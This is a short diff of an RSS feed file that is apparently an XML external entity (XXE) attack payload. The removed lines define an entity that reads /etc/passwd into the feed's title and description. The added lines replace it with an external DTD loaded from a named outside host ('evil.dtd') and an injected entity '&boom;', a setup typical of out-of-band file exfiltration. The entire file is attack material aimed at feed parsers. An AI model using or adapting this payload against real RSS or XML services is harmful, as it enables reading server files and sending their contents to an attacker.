@@ -1,16 +1,14 @@
-<?xml version="1.0"?>
-<!DOCTYPE root [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss SYSTEM "https://hack1tak.github.io/rss/evil.dtd">
 <rss version="2.0">
   <channel>
-    <title>&xxe;</title>
+    <title>&boom;</title>
     <link>http://example.com</link>
-    <description>Testing</description>
+    <description>Example feed</description>
     <item>
-      <title>Test</title>
+      <title>Injected Title</title>
       <link>http://example.com/item</link>
-      <description>&xxe;</description>
+      <description>&boom;</description>
       <pubDate>Fri, 05 Sep 2025 12:00:00 GMT</pubDate>
     </item>
   </channel>
